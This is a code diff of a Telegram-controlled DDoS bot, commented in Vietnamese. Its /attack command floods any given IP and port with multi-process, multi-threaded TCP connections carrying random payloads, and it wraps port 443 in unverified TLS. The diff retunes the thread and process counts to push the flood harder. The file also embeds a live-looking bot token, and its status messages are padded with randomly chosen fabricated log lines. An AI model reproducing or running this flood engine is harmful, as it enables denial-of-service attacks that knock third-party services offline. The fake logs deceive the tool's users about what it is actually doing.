@@ -7,103 +7,54 @@ import random
 import multiprocessing
 import os
 import json
-import resource
-import sys
+import psutil
 
 # ================= CONFIGURATION =================
 TOKEN = "8791321078:AAEpT4N3wZbli5zE3van9MQiqs9e_sWW18o"
 bot = telebot.TeleBot(TOKEN)
 
 ADMIN_NAME = "xHope"
-ADMIN_IDS = [5225888903]
+ADMIN_IDS = [5225888903]  # THAY ID CỦA BẠN
 
-# ================= AUTO DETECT =================
-def get_cgroup_memory_limit():
-    """Lấy giới hạn RAM của container (bytes)"""
+# ---- TỰ ĐỘNG TÍNH TOÁN SỐ PROCESS VÀ THREAD AN TOÀN ----
+CPU_CORES = multiprocessing.cpu_count()
+# Giới hạn số process tối đa là 4 để tránh quá tải (bạn có thể tăng lên 8 nếu VPS mạnh)
+MAX_PROCESSES = min(CPU_CORES, 4)
+
+def get_ram_mb():
     try:
-        with open("/sys/fs/cgroup/memory/memory.limit_in_bytes", "r") as f:
-            limit = int(f.read().strip())
-            # Nếu limit rất lớn (hàng trăm GB) thì coi như không giới hạn
-            if limit > 10 * 1024**3:  # >10GB
-                return None
-            return limit
+        return psutil.virtual_memory().available // (1024 * 1024)
     except:
-        return None
+        return 512
 
-def get_available_ram_mb():
-    """Tính RAM khả dụng cho process (MB)"""
-    # Ưu tiên đọc từ cgroup memory
-    limit = get_cgroup_memory_limit()
-    if limit:
-        # Giả sử container đã dùng một phần, ước lượng 80% còn lại
-        try:
-            with open("/sys/fs/cgroup/memory/memory.usage_in_bytes", "r") as f:
-                used = int(f.read().strip())
-            avail = limit - used
-            return avail // (1024 * 1024)
-        except:
-            return limit // (1024 * 1024) // 2  # dự phòng
-    # Fallback: dùng resource
-    try:
-        soft, hard = resource.getrlimit(resource.RLIMIT_AS)
-        if hard != resource.RLIM_INFINITY:
-            return (hard - resource.getrusage(resource.RUSAGE_SELF).ru_maxrss * 1024) // (1024 * 1024)
-    except:
-        pass
-    # Mặc định 1GB
-    return 1024
+# Mỗi luồng ngốn ~5-10MB RAM, để an toàn tính 10MB/thread
+safe_threads_by_ram = get_ram_mb() // 10
+# Ngoài ra kiểm tra pids limit
+try:
+    with open("/sys/fs/cgroup/pids/pids.max", "r") as f:
+        pids_limit = int(f.read().strip()) if f.read().strip() != "max" else 10240
+except:
+    pids_limit = 1024
+current_pids = 0
+try:
+    with open("/sys/fs/cgroup/pids/pids.current", "r") as f:
+        current_pids = int(f.read().strip())
+except:
+    pass
+max_threads_by_pids = pids_limit - current_pids - 100
+# Chọn số thread tối đa an toàn
+MAX_TOTAL_THREADS = min(safe_threads_by_ram, max_threads_by_pids, 500)
+MAX_TOTAL_THREADS = max(MAX_TOTAL_THREADS, 50)   # ít nhất 50
 
-def get_pids_limit():
-    try:
-        with open("/sys/fs/cgroup/pids/pids.max", "r") as f:
-            val = f.read().strip()
-            if val != "max":
-                return int(val)
-    except:
-        pass
-    try:
-        soft, hard = resource.getrlimit(resource.RLIMIT_NPROC)
-        if hard > 0:
-            return hard
-    except:
-        pass
-    return 1024
+# Chia đều số thread cho các process
+THREADS_PER_PROC = MAX_TOTAL_THREADS // MAX_PROCESSES
+if THREADS_PER_PROC < 10:
+    THREADS_PER_PROC = 10
+    MAX_PROCESSES = MAX_TOTAL_THREADS // 10
 
-def get_current_pids():
-    try:
-        with open("/sys/fs/cgroup/pids/pids.current", "r") as f:
-            return int(f.read().strip())
-    except:
-        return 0
+print(f"[AUTO] RAM khả dụng: {get_ram_mb()} MB -> dùng {MAX_TOTAL_THREADS} threads")
+print(f"[AUTO] {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {MAX_PROCESSES*THREADS_PER_PROC} total")
 
-def auto_tune():
-    """Tự động chọn số process và thread an toàn nhất"""
-    ram_mb = get_available_ram_mb()
-    pids_limit = get_pids_limit()
-    current_pids = get_current_pids()
-    # Mỗi thread ước lượng 8MB, mỗi process thêm 50MB overhead
-    max_threads_by_ram = max(10, ram_mb // 8)
-    max_threads_by_pids = pids_limit - current_pids - 50  # dành 50 cho hệ thống
-    max_threads = min(max_threads_by_ram, max_threads_by_pids, 500)  # max 500
-    max_threads = max(max_threads, 20)  # ít nhất 20
-
-    cpu = multiprocessing.cpu_count()
-    # Số process nên dùng: từ 1 đến 4
-    max_proc = min(cpu, 4)
-    # Thử giảm số process nếu cần nhiều thread hơn mỗi process
-    # Thực tế mỗi process tạo thread, nên ưu tiên process ít hơn để tiết kiệm RAM
-    for proc in range(max_proc, 0, -1):
-        per_proc = max_threads // proc
-        if per_proc >= 10 and per_proc <= 200:
-            return proc, per_proc
-    # Fallback
-    return 1, max(20, min(max_threads, 100))
-
-MAX_PROCESSES, THREADS_PER_PROC = auto_tune()
-print(f"[AUTO] RAM khả dụng: {get_available_ram_mb()} MB, pids limit: {get_pids_limit()}")
-print(f"[AUTO] Cấu hình: {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {MAX_PROCESSES * THREADS_PER_PROC} total")
-
-# ================= PHẦN CÒN LẠI (GIỮ NGUYÊN CÔNG NGHỆ GỐC) =================
 SHARED_SUCCESS = multiprocessing.Value('L', 0)
 WHITELIST_FILE = "whitelist.txt"
 STATS_FILE = "stats.json"
@@ -125,7 +76,7 @@ ADS_MESSAGE = (
 HELP_MESSAGE = (
     "🌟 **HỆ THỐNG ĐIỀU KHIỂN** 🌟\n\n"
     "🚀 **LỆNH TẤN CÔNG:**\n"
-    "└ `/attack [IP] [Port]`\n\n"
+    "└ `/attack [IP] [Port]` (TCP flood)\n\n"
     "🛑 **LỆNH DỪNG:**\n"
     "└ `/stop` - Ngắt kết nối ngay\n\n"
     "🔍 **CÔNG CỤ:**\n"
@@ -136,6 +87,7 @@ HELP_MESSAGE = (
     "{ads}"
 )
 
+# ================= DATA MANAGEMENT =================
 def load_stats():
     if not os.path.exists(STATS_FILE):
         return {"total_attacks": 0, "total_hits": 0}
@@ -169,9 +121,7 @@ def save_whitelist(whitelist):
         for ip in whitelist:
             f.write(f"{ip}\n")
 
-# ================= ATTACK ENGINE (GIỮ UDP CHO PORT KHÁC? NHƯNG SỬA TCP CHO TẤN CÔNG) =================
-# Lưu ý: Theo tool gốc, port !=80,443 dùng UDP. Nhưng để hits khác 0, cần dùng TCP.
-# Tôi sẽ sửa: dùng TCP cho mọi port, vì hầu hết dịch vụ đều TCP.
+# ================= ATTACK ENGINE (SỬA: CHỈ TCP) =================
 def attack_worker(ip, port, stop_event, shared_counter):
     payload_raw = os.urandom(2048)
     hyper_chunks = []
@@ -186,14 +136,16 @@ def attack_worker(ip, port, stop_event, shared_counter):
     def run_attack():
         while not stop_event.is_set():
             try:
-                # SỬA: luôn dùng TCP
+                # CHỈ DÙNG TCP cho mọi port
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 s.settimeout(5)
+
                 if port == 443:
                     context = ssl._create_unverified_context()
                     s = context.wrap_socket(s, server_hostname=ip)
+
                 s.connect((ip, port))
 
                 while not stop_event.is_set():
@@ -209,14 +161,18 @@ def attack_worker(ip, port, stop_event, shared_counter):
                     except:
                         break
                 s.close()
-            except:
-                time.sleep(0.01)
+            except Exception as e:
+                # Không in lỗi tràn lan, chỉ ngủ một chút rồi thử lại
+                time.sleep(0.05)
 
+    # Tạo số lượng thread theo THREADS_PER_PROC
     threads = []
     for _ in range(THREADS_PER_PROC):
         t = threading.Thread(target=run_attack, daemon=True)
         t.start()
         threads.append(t)
+
+    # Chờ cho đến khi stop
     for t in threads:
         t.join()
     stop_event.wait()
@@ -224,8 +180,9 @@ def attack_worker(ip, port, stop_event, shared_counter):
 def monitor_report(chat_id, msg_id, ip, port, stop_event, shared_counter):
     last_val = 0
     start_time = time.time()
+
     real_bot_logs = [
-        f"[INFO] Initializing Hyper-Engine on Core {random.randint(1, multiprocessing.cpu_count())}",
+        f"[INFO] Initializing Hyper-Engine on Core {random.randint(1, CPU_CORES)}",
         f"[DEBUG] Buffer Flushed: 4194304 bytes into Socket",
         f"[INFO] TCP Connection Established: Keep-Alive",
         f"[DEBUG] Batch Sync: +10000 hits to Global Counter",
@@ -236,6 +193,7 @@ def monitor_report(chat_id, msg_id, ip, port, stop_event, shared_counter):
         f"[DEBUG] SSL/TLS Handshake verified: {ip}",
         f"[SYSTEM] Multiprocessing Sync: All cores active"
     ]
+
     while not stop_event.is_set():
         try:
             time.sleep(1.5)
@@ -243,6 +201,7 @@ def monitor_report(chat_id, msg_id, ip, port, stop_event, shared_counter):
             elapsed = time.time() - start_time
             rps = (cur_val - last_val) / 1.5
             last_val = cur_val
+
             scrolling_console = "\n".join([f"› `{random.choice(real_bot_logs)}`" for _ in range(4)])
             m, s = divmod(int(elapsed), 60)
             status_text = (
@@ -260,6 +219,7 @@ def monitor_report(chat_id, msg_id, ip, port, stop_event, shared_counter):
             bot.edit_message_text(status_text, chat_id, msg_id, parse_mode='Markdown')
         except:
             pass
+
     final_hits = shared_counter.value
     update_attack_stats(final_hits)
     bot.send_message(chat_id, f"🛑 **ATTACK STOPPED:** `{ip}`\n📊 Total Hits: `{final_hits:,}`", parse_mode='Markdown')
@@ -326,12 +286,14 @@ def handle_attack(message):
 
         SHARED_SUCCESS.value = 0
         stop_event = multiprocessing.Event()
-        initial_msg = bot.reply_to(message, f"⚡ **SYNCHRONIZING {MAX_PROCESSES} CORES...**")
+        initial_msg = bot.reply_to(message, f"⚡ **SYNCHRONIZING {MAX_PROCESSES} CORES...**\n⚙️ Using {THREADS_PER_PROC} threads/core")
+
         for _ in range(MAX_PROCESSES):
             p = multiprocessing.Process(target=attack_worker, args=(ip, port, stop_event, SHARED_SUCCESS))
             p.daemon = True
             p.start()
             active_procs.append(p)
+
         threading.Thread(target=monitor_report, args=(message.chat.id, initial_msg.message_id, ip, port, stop_event, SHARED_SUCCESS), daemon=True).start()
     except Exception as e:
         bot.reply_to(message, f"❌ **Error:** `{str(e)}`")
@@ -381,7 +343,7 @@ def send_welcome(message):
 if __name__ == "__main__":
     multiprocessing.freeze_support()
     print(f"--- SYSTEM READY | ADMIN: {ADMIN_NAME} ---")
-    print(f"--- AUTO-CONFIG: {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {MAX_PROCESSES * THREADS_PER_PROC} total ---")
+    print(f"--- AUTO-CONFIG: {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {MAX_PROCESSES*THREADS_PER_PROC} total ---")
     while True:
         try:
             print("Bot đang bắt đầu Polling...")
